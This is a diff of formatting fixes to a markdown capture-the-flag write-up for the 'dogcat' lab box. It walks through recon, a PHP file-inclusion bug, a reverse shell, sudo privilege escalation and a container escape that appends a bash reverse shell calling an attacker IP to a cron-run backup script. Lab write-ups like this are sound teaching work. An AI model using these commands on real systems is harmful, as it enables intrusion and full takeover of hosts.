@@ -8,12 +8,12 @@ We know there is a website hosting dog and cat pictures. Let's have a look...
 
 ### nmap
 
-Running nmap to search for available services and versions: ```nmap -sC -sV 10.10.46.238```
+Running nmap to search for available services and versions:```nmap -sC -sV 10.10.46.238```
 
 ??? output "Nmap output"
     Result: two ports open SSH on 22 and HTTP on 80
 
-    ``` txt
+   ``` txt
     Host is up (0.021s latency).
     Not shown: 998 closed ports
     PORT   STATE SERVICE VERSION
@@ -26,7 +26,7 @@ Running nmap to search for available services and versions: ```nmap -sC -sV 10.1
     |_http-server-header: Apache/2.4.38 (Debian)
     |_http-title: dogcat
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-    ```
+   ```
 
 ### gobuster
 
@@ -57,10 +57,10 @@ Apache/2.4.38 (Debian)
 
 ### nikto
 
-Running nikto confirms the apache web server and shows PHP is used: ```nikto -h 10.10.46.238```
+Running nikto confirms the apache web server and shows PHP is used:```nikto -h 10.10.46.238```
 
 ??? output "nikto output"
-    ``` sh
+   ``` sh
     nikto -h 10.10.46.238
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -81,7 +81,7 @@ Running nikto confirms the apache web server and shows PHP is used: ```nikto -h 
     + End Time:           2021-00-00 00:00:00 (GMT-4) (326 seconds)
     ---------------------------------------------------------------------------
     + 1 host(s) tested
-    ```
+   ```
 
 ## Visit website
 
@@ -169,7 +169,7 @@ The index.php looks as follows:
 </html>
 ```
 
-The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```. We see that if we add the parameter ```?ext``` we are no longer limited to requesting php files. We can add e.g. ```&ext=.txt``` or ```&ext=.log``` to view a text or log file or simply keep the parameter empty to view any file ```&ext=```.
+The interesting line here is```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```. We see that if we add the parameter```?ext``` we are no longer limited to requesting php files. We can add e.g.```&ext=.txt``` or```&ext=.log``` to view a text or log file or simply keep the parameter empty to view any file```&ext=```.
 
 Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):
 
@@ -185,7 +185,7 @@ If you feel lucky, you could've guessed that there is a flag.php in the main fol
 ?view=php://filter/convert.base64-encode/resource=./cat/../flag
 ```
 
-We get the message: ```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d...```
+We get the message:```Here you go!PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2d...```
 
 Which we can decode as follows to get the first flag:
 
@@ -260,7 +260,7 @@ We can now start the shell.php located in the the main web folder:
 ```
 
 On the netcat terminal we should now have a command prompt :)
-Running ```whoami``` we see we are user "www-data". Searching for flag2 reveals the following file:
+Running```whoami``` we see we are user "www-data". Searching for flag2 reveals the following file:
 
 ``` sh
 find / -type f -iname "flag*"
@@ -278,10 +278,10 @@ Btw, it is possible to view flag2 within the browser and without reverse shell:
 
 Now that we have a shell as user "www-data":
 
-- let's see what this user is allowed to do: ```sudo -l```
-- We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access: ```sudo /usr/bin/env sudo -i```
+- let's see what this user is allowed to do:```sudo -l```
+- We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access:```sudo /usr/bin/env sudo -i```
 
-Running ```whoami``` we can see that we are root. Now, let's again look for a flag:
+Running```whoami``` we can see that we are root. Now, let's again look for a flag:
 
 ``` sh
 find / -type f -iname "flag*"
@@ -292,18 +292,18 @@ find / -type f -iname "flag*"
 
 The last challenge is to find flag 4 which is nowhere to be found on the current system. We need to search for interesting things on the system...
 
-List IP addresses connected to your server on port 80: ```netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head```
+List IP addresses connected to your server on port 80:```netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head```
 
 In the root folder we can find a ".dockerenv" file.
 The hostname looks like a default docker container name.
 
-- Let's see if proc/self/cgroup contains "docker" or "lxc": ```grep 'docker\|lxc' /proc/1/cgroup```.
-- or run this script: ```echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi```
+- Let's see if proc/self/cgroup contains "docker" or "lxc":```grep 'docker\|lxc' /proc/1/cgroup```.
+- or run this script:```echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi```
 
 So we know we are running in a container. Let us look around and find other interesting files e.g.:
 
-- search for largest files: ```lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail```
-- or search for newest files ```find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print```
+- search for largest files:```lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail```
+- or search for newest files```find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print```
 
 We find that "backup.tar" was last updated and it is updated every minute!
 It seems as if the backup is created using the shell script in the same folder.
@@ -312,12 +312,12 @@ This looks promising: We are root in a container that hosts the dogcat website a
 
 Let's try to exploit the backup.sh with a bash reverse shell:
 
-- Start a new netcat session on your system: ```nc -lvnp 7777```
-- Append the bash reverse shell to the backup script: ```echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh```
+- Start a new netcat session on your system:```nc -lvnp 7777```
+- Append the bash reverse shell to the backup script:```echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh```
 
 After waiting at most 59 seconds the backup job will trigger, run our modified script and we get another shell from the container host system.
 
-Running ```whoami``` we can see that we are root - whoop whoop!
+Running```whoami``` we can see that we are root - whoop whoop!
 
 Let's search for flag 4:
 
